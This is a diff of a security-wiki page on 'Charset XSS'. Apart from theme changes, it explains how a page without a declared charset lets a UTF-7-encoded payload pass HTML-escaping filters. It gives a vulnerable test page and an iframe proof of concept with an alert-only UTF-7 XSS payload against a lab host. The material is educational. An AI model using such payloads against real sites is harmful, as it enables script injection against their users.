@@ -1,43 +1,63 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Charset XSS # Charset XSS is useful in cases where application filters HTML special characters like &lt; &amp; &gt;, You might have seen these characters converting back into &amp;gt; &amp; &amp;lt; respectively.
-For example consider the following codes
-&lt;?php if(isset($_GET[&#39;xss&#39;])) { echo htmlspecialchars($_GET[&#39;xss&#39;]); } ?&gt; and similarly for DOM XSS code
-&lt;html&gt; &lt;head&gt; &lt;title&gt;test page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var bad_string = window.location.hash.substring(1); var regex = /&lt;\&gt;/gi; var good_string = bad_string.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Charset XSS" />
-<meta property="og:description" content="Charset XSS # Charset XSS is useful in cases where application filters HTML special characters like &lt; &amp; &gt;, You might have seen these characters converting back into &amp;gt; &amp; &amp;lt; respectively.
-For example consider the following codes
-&lt;?php if(isset($_GET[&#39;xss&#39;])) { echo htmlspecialchars($_GET[&#39;xss&#39;]); } ?&gt; and similarly for DOM XSS code
-&lt;html&gt; &lt;head&gt; &lt;title&gt;test page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var bad_string = window.location.hash.substring(1); var regex = /&lt;\&gt;/gi; var good_string = bad_string." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/charset-xss/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2022-01-24T03:26:13+05:30" />
-<title>Charset XSS | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Charset XSS# Charset XSS is useful in cases where application filters HTML special characters like &lt; &amp; &gt;, You might have seen these characters converting back into &amp;gt; &amp; &amp;lt; respectively.
+For example consider the following codes
+&lt;?php if(isset($_GET[&#39;xss&#39;])) { echo htmlspecialchars($_GET[&#39;xss&#39;]); } ?&gt;and similarly for DOM XSS code
+&lt;html&gt; &lt;head&gt; &lt;title&gt;test page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var bad_string = window.location.hash.substring(1); var regex = /&lt;\&gt;/gi; var good_string = bad_string.replace(regex,&#39;&#39;) document.write(good_string); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;using charset XSS it is possible to bypass html special characters filtration
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/charset-xss/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Charset XSS">
+	<meta property="og:description" content="Charset XSS# Charset XSS is useful in cases where application filters HTML special characters like &lt; &amp; &gt;, You might have seen these characters converting back into &amp;gt; &amp; &amp;lt; respectively.
+For example consider the following codes
+&lt;?php if(isset($_GET[&#39;xss&#39;])) { echo htmlspecialchars($_GET[&#39;xss&#39;]); } ?&gt;and similarly for DOM XSS code
+&lt;html&gt; &lt;head&gt; &lt;title&gt;test page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var bad_string = window.location.hash.substring(1); var regex = /&lt;\&gt;/gi; var good_string = bad_string.replace(regex,&#39;&#39;) document.write(good_string); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;using charset XSS it is possible to bypass html special characters filtration">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2022-01-24T03:26:13+05:30">
+
+
+	<meta itemprop="name" content="Charset XSS">
+	<meta itemprop="description" content="Charset XSS# Charset XSS is useful in cases where application filters HTML special characters like &lt; &amp; &gt;, You might have seen these characters converting back into &amp;gt; &amp; &amp;lt; respectively.
+For example consider the following codes
+&lt;?php if(isset($_GET[&#39;xss&#39;])) { echo htmlspecialchars($_GET[&#39;xss&#39;]); } ?&gt;and similarly for DOM XSS code
+&lt;html&gt; &lt;head&gt; &lt;title&gt;test page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var bad_string = window.location.hash.substring(1); var regex = /&lt;\&gt;/gi; var good_string = bad_string.replace(regex,&#39;&#39;) document.write(good_string); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;using charset XSS it is possible to bypass html special characters filtration">
+	<meta itemprop="dateModified" content="2022-01-24T03:26:13+05:30">
+	<meta itemprop="wordCount" content="182">
+
+<title>Charset XSS • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/charset-xss/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -45,11 +65,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -60,9 +84,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -77,8 +98,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -94,8 +115,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -181,8 +202,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -229,8 +250,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -984,8 +1005,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1006,8 +1027,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1028,8 +1049,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1050,8 +1071,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1072,8 +1093,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1107,8 +1128,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1129,8 +1150,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1151,8 +1172,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1173,35 +1194,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1209,30 +1208,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Charset XSS</strong>
+  <h3>Charset XSS</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1255,19 +1255,15 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="charset-xss">
-  Charset XSS
-  <a class="anchor" href="#charset-xss">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="charset-xss">Charset XSS<a class="anchor" href="#charset-xss">#</a></h1>
 <p>Charset XSS is useful in cases where application filters HTML special characters like <code>&lt;</code> &amp; <code>&gt;</code>, You might have seen these characters converting back into <code>&amp;gt;</code> &amp; <code>&amp;lt;</code> respectively.</p>
 <p>For example consider the following codes</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&lt;?php
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&lt;?php
 </span></span><span style="display:flex;"><span>if(isset($_GET[&#39;xss&#39;])) {
 </span></span><span style="display:flex;"><span>    echo htmlspecialchars($_GET[&#39;xss&#39;]);
 </span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>?&gt;
-</span></span></code></pre></div><p>and similarly for DOM XSS code</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&lt;html&gt;
+</span></span><span style="display:flex;"><span>?&gt;</span></span></code></pre></div><p>and similarly for DOM XSS code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&lt;html&gt;
 </span></span><span style="display:flex;"><span>    &lt;head&gt;
 </span></span><span style="display:flex;"><span>        &lt;title&gt;test page&lt;/title&gt;
 </span></span><span style="display:flex;"><span>    &lt;/head&gt;
@@ -1279,57 +1275,50 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>            document.write(good_string);
 </span></span><span style="display:flex;"><span>        &lt;/script&gt;
 </span></span><span style="display:flex;"><span>    &lt;/body&gt;
-</span></span><span style="display:flex;"><span>&lt;/html&gt;
-</span></span></code></pre></div><p>using charset XSS it is possible to bypass html special characters filtration</p>
-<h2 id="requirements">
-  Requirements
-  <a class="anchor" href="#requirements">#</a>
-</h2>
+</span></span><span style="display:flex;"><span>&lt;/html&gt;</span></span></code></pre></div><p>using charset XSS it is possible to bypass html special characters filtration</p>
+<h2 id="requirements">Requirements<a class="anchor" href="#requirements">#</a></h2>
 <ul>
 <li>Target site not implemented charset</li>
 <li>Target site implemented the wrong charset</li>
 </ul>
-<h2 id="example-works-in-ie-11">
-  Example works in IE-11
-  <a class="anchor" href="#example-works-in-ie-11">#</a>
-</h2>
+<h2 id="example-works-in-ie-11">Example works in IE-11<a class="anchor" href="#example-works-in-ie-11">#</a></h2>
 <p>Consider the same DOM XSS code</p>
-<details open><summary>xss.html</summary>
-  <div class="markdown-inner">
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&lt;html&gt;
-</span></span><span style="display:flex;"><span>    &lt;head&gt;
-</span></span><span style="display:flex;"><span>        &lt;title&gt;test page&lt;/title&gt;
-</span></span><span style="display:flex;"><span>    &lt;/head&gt;
-</span></span><span style="display:flex;"><span>    &lt;body&gt;
-</span></span><span style="display:flex;"><span>        &lt;script&gt;
-</span></span><span style="display:flex;"><span>            var bad_string = window.location.hash.substring(1);
-</span></span><span style="display:flex;"><span>            var regex = /&lt;\&gt;/gi;
-</span></span><span style="display:flex;"><span>            var good_string = bad_string.replace(regex,&#39;&#39;)
-</span></span><span style="display:flex;"><span>            document.write(good_string);
-</span></span><span style="display:flex;"><span>        &lt;/script&gt;
-</span></span><span style="display:flex;"><span>    &lt;/body&gt;
-</span></span><span style="display:flex;"><span>&lt;/html&gt;
-</span></span></code></pre></div>
-  </div>
-</details>
+<details open="true" ><summary>xss.html</summary><div class="markdown-inner">
 
+
+```text
+<html>
+    <head>
+        <title>test page</title>
+    </head>
+    <body>
+        <script>
+            var bad_string = window.location.hash.substring(1);
+            var regex = /<\>/gi;
+            var good_string = bad_string.replace(regex,'')
+            document.write(good_string);
+        </script>
+    </body>
+</html>
+```
+</div></details>
 <p>Since this page does not have any charset defines that means it fulfil the requirements for charset XSS. In order to do it, we will create a document with UTF-7 encoding and load the vulnerable URL in the iframe.</p>
-<details open><summary>iframe.html</summary>
-  <div class="markdown-inner">
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
-</span></span><span style="display:flex;"><span>&lt;html&gt;
-</span></span><span style="display:flex;"><span>&lt;head&gt;
-</span></span><span style="display:flex;"><span>    &lt;meta charset=&#34;UTF-7&#34;&gt;
-</span></span><span style="display:flex;"><span>&lt;/head&gt;
-</span></span><span style="display:flex;"><span>&lt;body&gt;
-</span></span><span style="display:flex;"><span>    &lt;iframe src=&#34;http://lab.com:8888/common/c.html#&lt;p&gt;+ADw-svg/onload+AD0-alert(1444444)+AD4-&lt;/p&gt;&#34; frameborder=&#34;1&#34;
-</span></span><span style="display:flex;"><span>        height=&#34;300&#34; width=&#34;500&#34;&gt;&lt;/iframe&gt;
-</span></span><span style="display:flex;"><span>&lt;/body&gt;
-</span></span><span style="display:flex;"><span>&lt;/html&gt;
-</span></span></code></pre></div>
-  </div>
-</details>
+<details open="true" ><summary>iframe.html</summary><div class="markdown-inner">
 
+```text
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-7">
+</head>
+<body>
+    <iframe src="http://lab.com:8888/common/c.html#<p>+ADw-svg/onload+AD0-alert(1444444)+AD4-</p>" frameborder="1"
+        height="300" width="500"></iframe>
+</body>
+</html>
+```
+
+</div></details>
 <p>As soon as we access iframe.html we triage javaScript code execution since xss.html doesn&rsquo;t have any charset defined and hence browser inherit top frame&rsquo;s charset which is UTF-7.</p>
 </article>
  
@@ -1339,49 +1328,62 @@ https://github.com/alex-shpak/hugo-book
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/bffd1cf7c048b9641fd074ff675ed1bee9c03b77" title='Last modified by krAshwin | January 23, 2022' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>January 23, 2022</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/charset-xss.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Business-logic-Vulnerabilities/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Business Logic</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Clickjacking/" class="flex align-center">
+        <span>Clickjacking</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -1395,15 +1397,24 @@ https://github.com/alex-shpak/hugo-book
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
